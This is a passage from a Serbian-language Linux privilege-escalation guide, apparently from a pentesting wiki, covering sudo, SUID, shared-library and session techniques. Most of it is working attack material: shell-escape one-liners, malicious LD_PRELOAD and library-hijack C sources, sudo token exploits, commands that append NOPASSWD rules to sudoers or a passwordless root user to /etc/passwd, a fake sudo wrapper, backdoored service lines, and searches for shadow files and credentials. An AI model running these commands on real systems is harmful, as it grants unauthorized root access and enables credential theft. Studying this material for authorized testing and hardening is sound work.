Iskoristi ga koristeći: **`systemd-run -t /bin/bash`**

### Grupe

Proveri da li si **član neke grupe** koja bi ti mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proveri da li se u međuspremniku nalazi nešto zanimljivo (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** okruženja **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta pravljenje puno buke i na računaru su prisutni binarni fajlovi `su` i `timeout`, možete pokušati da izvršite brute-force nad korisnikom koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da izvrši brute-force nad korisnicima.

## Iskorišćavanje zapisivog PATH-a

### $PATH

Ako otkrijete da možete **pisati u neki folder iz $PATH** možda ćete moći da eskalirate privilegije tako što ćete **kreirati backdoor unutar zapisivog foldera** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (po mogućstvu root) i koja **nije učitana iz foldera koji se nalazi pre vašeg zapisivog foldera u $PATH**.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo ili te komande mogu imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju čitanje i/ili pisanje fajlova ili čak izvršavanje komande.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši određenu komandu sa privilegijama drugog korisnika bez potrebe da zna lozinku.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh key u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **set an environment variable** dok izvršava nešto:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **based on HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** da učita proizvoljnu python biblioteku dok se skripta izvršava kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sačuvan putem sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr., `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnog shell-a da pokrenete proizvoljni kod kao root prilikom poziva dozvoljene komande.

- Zašto ovo radi: Za neinteraktivne shell-ove, Bash evaluira `$BASH_ENV` i source-uje tu datoteku pre pokretanja ciljane skripte. Mnoge sudo politike dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako `BASH_ENV` bude sačuvan od strane sudo, vaša datoteka će biti source-ovana sa root privilegijama.

- Zahtevi:
- Pravilo u sudo koje možete pokrenuti (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koja bash skripta).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, radije koristite `env_reset`.
- Izbegavajte shell wrapper-e za komande kojima je dozvoljen sudo; koristite minimalne binarne fajlove.
- Razmotrite sudo I/O logovanje i alertovanje kada se koriste sačuvane env promenljive.

### Sudo — putanje za zaobilaženje izvršavanja

**Preskakanje** za čitanje drugih fajlova ili korišćenje **symlinks**. Na primer, u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje komande

Ako je korisniku dodeljena **sudo dozvola** za jednu komandu **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti tako što ćete promeniti promenljivu PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se može koristiti i ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite pomoću** _**strings**_ **sadržaj čudnog SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možete pokušati da **export a function** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_, morate pokušati da kreirate funkciju i exportujete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Varijabla okruženja **LD_PRELOAD** se koristi za specificiranje jedne ili više deljenih biblioteka (.so fajlova) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao preloading biblioteke.

Međutim, da bi se održala sigurnost sistema i sprečilo da se ova funkcija zloupotrebi, naročito sa **suid/sgid** izvršnim fajlovima, sistem nameće određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde realni korisnički ID (_ruid_) ne odgovara efektivnom korisničkom ID-u (_euid_).
- Za izvršne fajlove sa **suid/sgid**, samo biblioteke u standardnim putanjama koje su takođe **suid/sgid** se prethodno učitavaju.

Eskalcija privilegija može nastati ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` sadrži stavku **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** ostane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Konačno, **escalate privileges** izvršavanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env variable, jer tada kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binary sa **SUID** permisijama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za exploitation.

Da biste izvršili exploitation, treba kreirati C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, nakon kompajliranja i izvršavanja, ima za cilj eskalaciju privilegija manipulacijom dozvola datoteke i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binarnog fajla bi trebalo da pokrene exploit, omogućavajući potencijalno system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava library iz foldera u koji možemo pisati, napravimo library u tom folderu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da ima funkciju zvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubaciti argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti da se pobegne iz ograničenih shellova, eskaliraju ili održe povišene privilegije, prenesu fajlovi, pokrenu bind i reverse shelle, i olakšaju druge post-exploitation zadatke.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15mins** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) će napraviti sh shell u _/tmp_ **u vlasništvu root korisnika sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u direktorijumu ili na bilo kojem od fajlova kreiranih u njemu, možete koristiti binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **create a sudo token for a user and PID**.\
Na primer, ako možete overwrite fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj user sa PID 1234, možete **obtain sudo privileges** bez potrebe da znate password radeći:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i na koji način. Ovi fajlovi **po defaultu mogu da budu čitani samo od strane korisnika root i grupe root**.\
**Ako** možete **čitati** ovaj fajl mogli biste biti u mogućnosti da **dobijete neke zanimljive informacije**, a ako možete **pisati** bilo koji fajl bićete u mogućnosti da **eskalirate privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete da pišete, možete da zloupotrebite ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za binarni program `sudo`, kao što je `doas` za OpenBSD; ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** da bi eskalirao privilegije i dobijete shell u kontekstu tog korisnika, možete **kreirati novi sudo executable** koji će izvršiti vaš kod kao root, a zatim komandu korisnika. Zatim, **izmenite $PATH** u kontekstu korisnika (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pokrene sudo, izvršiće se vaš sudo executable.

Imajte na umu da ako korisnik koristi drugi shell (ne bash) moraćete da izmenite druge fajlove da biste dodali novi put. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Drugi primer možete pronaći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Fajl `/etc/ld.so.conf` pokazuje **odakle dolaze učitane konfiguracione datoteke**. Tipično, ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će se čitati konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Ove konfiguracione datoteke **pokazuju na druge foldere** gde će se tražiti **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za upis** na bilo koju od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koji fajl unutar `/etc/ld.so.conf.d/` ili bilo koji folder na koji pokazuje konfig fajl unutar `/etc/ld.so.conf.d/*.conf` on može dobiti povišene privilegije.\ Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj strani:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/`, program će ga koristiti na ovom mestu, kako je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Ovo efektivno deli root **privilegije na manje i odvojene jedinice**. Svaka od ovih jedinica može potom biti nezavisno dodeljena procesima. Na taj način se puni skup privilegija smanjuje, čime se umanjuju rizici od eksploatacije.\
Pročitajte sledeću stranicu da **saznate više o capabilities i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** implicira da pogođeni korisnik može "**cd**" u folder.\
**"read"** bit implicira da korisnik može **prikazati** **fajlove**, a **"write"** bit implicira da korisnik može **obrisati** i **kreirati** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima omogućavajući ili uskraćujući prava specifičnim korisnicima koji nisu vlasnici niti deo grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dalje detalje možete pronaći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeliti** korisniku "kali" "read" i "write" dozvole nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dobavi** datoteke sa specifičnim ACLs iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sesije

U **starim verzijama** možda možete **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da se **connect** na **screen** sesije samo **svog korisnika**. Međutim, u sesiji možete pronaći **interesantne informacije**.

### screen sessions hijacking

**Prikaži screen sesije**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Priključite se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Preuzimanje tmux sesija

Ovo je bio problem sa **starim verzijama tmux-a**. Nisam mogao da preuzmem tmux (v2.1) sesiju kreiranu od strane root-a kao neprivilegovani korisnik.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključi se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na Debian-based sistemima (Ubuntu, Kubuntu, etc) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bagom.\
Ovaj bag nastaje prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je bilo moguće samo **32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i **imajući ssh public key možete potražiti odgovarajući private key**. Možete pronaći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Određuje da li je password authentication dozvoljen. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je public key authentication dozvoljen. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je password authentication dozvoljen, određuje da li server dozvoljava login na naloge sa praznim password stringovima. Podrazumevano je `no`.

### PermitRootLogin

Navodi da li se root može prijaviti koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći password i private key
- `without-password` or `prohibit-password`: root može da se prijavi samo pomoću private key
- `forced-commands-only`: Root može da se prijavi samo pomoću private key i ako su opcije commands specificirane
- `no` : ne

### AuthorizedKeysFile

Navodi fajlove koji sadrže public keys koji se mogu koristiti za korisničku autentifikaciju. Može sadržati tokene kao `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (koje počinju sa `/`) ili **relativne putanje iz korisničkog home-a**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će naznačiti da, ako pokušate da se prijavite koristeći **private** key korisnika "**testusername**", ssh će uporediti public key vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding omogućava vam da **use your local SSH keys instead of leaving keys** (bez passphrases!) koji stoje na vašem serveru. Dakle, moći ćete da se putem ssh **jump** na **host** i odatle **jump to another** host koristeći **key** koji se nalazi na vašem **initial host**.

Treba da postavite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*`, svaki put kada korisnik prelazi na drugi host, taj host će moći da pristupi keys (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **nadjačati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju pročitajte sledeću stranicu jer **možda ga možete zlorabiti da biste eskalirali privilegije**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Datoteke profila

Fajl `/etc/profile` i fajlovi ispod `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Stoga, ako možete **da napišete ili izmenite bilo koju od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Passwd/Shadow fajlovi

Ako se pronađe neka neobična skripta profila, trebalo bi je proveriti zbog **osetljivih informacija**.

U zavisnosti od OS-a, `/etc/passwd` i `/etc/shadow` fajlovi mogu imati drugo ime ili može postojati rezervna kopija. Zato se preporučuje da **pronađete sve** i **proverite da li ih možete pročitati** kako biste videli **da li se u njima nalaze hash-ovi**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u `/etc/passwd` (ili u ekvivalentnoj datoteci).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd (moguće pisanje)

Prvo, generišite lozinku koristeći jednu od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i dodajte generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može ugroziti trenutni nivo bezbednosti mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi u `/etc/pwd.db` i `/etc/master.passwd`; takođe, `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete **pisati u neke osetljive fajlove**. Na primer, možete li upisati u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **izmeniti fajl konfiguracije Tomcat servisa unutar /etc/systemd/,** onda možete izmeniti sledeće linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će biti izvršen sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeći folderi mogu da sadrže backups ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobična lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjim minutima
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/binarne datoteke u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih datoteka koje bi mogle sadržavati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je open source aplikacija koja se koristi za dohvatanje velikog broja lozinki pohranjenih na lokalnom računaru za Windows, Linux & Mac.

### Logs

Ako možete čitati logs, možda ćete uspeti da pronađete **zanimljive/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti interesantniji.\
